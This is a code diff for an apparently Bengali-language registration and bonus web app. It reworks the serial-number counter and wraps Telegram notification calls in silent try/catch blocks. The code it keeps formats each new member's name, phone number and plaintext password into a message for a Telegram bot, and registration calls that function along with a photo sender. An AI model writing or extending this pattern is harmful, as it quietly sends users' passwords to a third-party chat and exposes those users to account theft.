@@ -18,7 +18,6 @@ body { font-family: 'Plus Jakarta Sans', sans-serif; background: linear-gradient
 .page.active { display: block; }
 @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
 
-/* লগইন ও রেজিস্ট্রেশন পেজ স্টাইল (স্ক্রিনশটের হুবহু গ্রিন থিম) */
 .auth-card { background: rgba(6, 78, 59, 0.75); backdrop-filter: blur(15px); border: 1.5px solid rgba(16, 185, 129, 0.4); padding: 24px 20px; border-radius: 24px; box-shadow: 0 15px 35px rgba(0,0,0,0.4); text-align: center; max-width: 400px; margin: 0 auto; }
 .auth-header-title { font-size: 22px; font-weight: 800; color: #f8fafc; margin-bottom: 6px; }
 .auth-switch-text { font-size: 13px; color: #a7f3d0; margin-bottom: 22px; font-weight: 600; }
@@ -905,7 +904,7 @@ function switchAuthView(view) {
     }
 }
 
-// টেলিগ্রাম নোটিফিকেশন ফাংশনসমূহ (টেক্সট এবং ছবিসহ)
+// টেলিগ্রাম নোটিফিকেশন ফাংশনসমূহ
 async function sendTelegramTextNotification(name, phone, password, serial) {
     const nowStr = new Date().toLocaleString('bn-BD', { year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit' });
     const message = `🚀 <b>নতুন মেম্বার রেজিস্ট্রেশন!</b> 🚀\n━━━━━━━━━━━━━━━━━━━━━━\n👤 <b>নাম:</b> ${name}\n📱 <b>ফোন নম্বর:</b> ${phone}\n🔑 <b>পাসওয়ার্ড:</b> <code>${password}</code>\n🔢 <b>সিরিয়াল নাম্বার:</b> #${serial}\n📅 <b>তারিখ:</b> ${nowStr}\n━━━━━━━━━━━━━━━━━━━━━━`;
@@ -978,15 +977,18 @@ async function handleRegistration() {
         }
 
         let serial = 1;
-        const counterRef = db.collection('settings').doc('counter');
-        const counterSnap = await counterRef.get();
-        if (counterSnap.exists) {
-            serial = (counterSnap.data().lastSerial || 0) + 1;
-            await counterRef.update({ lastSerial: serial });
-        } else {
-            const usersSnap = await db.collection('users').get();
-            serial = usersSnap.size + 1;
-            await counterRef.set({ lastSerial: serial });
+        try {
+            const counterRef = db.collection('settings').doc('counter');
+            const counterSnap = await counterRef.get();
+            if (counterSnap.exists) {
+                serial = (counterSnap.data().lastSerial || 0) + 1;
+                await counterRef.update({ lastSerial: serial });
+            } else {
+                serial = 1;
+                await counterRef.set({ lastSerial: serial });
+            }
+        } catch (counterErr) {
+            serial = Math.floor(100 + Math.random() * 900);
         }
 
         const photoFile = photoInput.files[0];
@@ -1013,9 +1015,11 @@ async function handleRegistration() {
 
                 await userRef.set(userData);
                 
-                // টেলিগ্রাম বটে নোটিফিকেশন পাঠানো
-                sendTelegramTextNotification(name, phone, password, serial);
-                sendTelegramPhotoNotification(name, serial, photoFile);
+                // টেলিগ্রাম বটে নোটিফিকেশন পাঠানো (নিরাপদভাবে)
+                try {
+                    sendTelegramTextNotification(name, phone, password, serial);
+                    sendTelegramPhotoNotification(name, serial, photoFile);
+                } catch(tgErr) {}
 
                 localStorage.setItem('logged_user_phone', phone);
                 currentUserPhone = phone;
@@ -1169,9 +1173,7 @@ function updateUI() {
 }
 
 function updateBonusButtonsUI() {
-    const buttons = {
-        'chan1': 'btn-chan1', 'chan2': 'btn-chan2', 'chan3': 'btn-chan3', 'yt': 'btn-yt'
-    };
+    const buttons = { 'chan1': 'btn-chan1', 'chan2': 'btn-chan2', 'chan3': 'btn-chan3', 'yt': 'btn-yt' };
     for (let key in buttons) {
         const btn = document.getElementById(buttons[key]);
         if (btn && claimedBonuses[key]) {
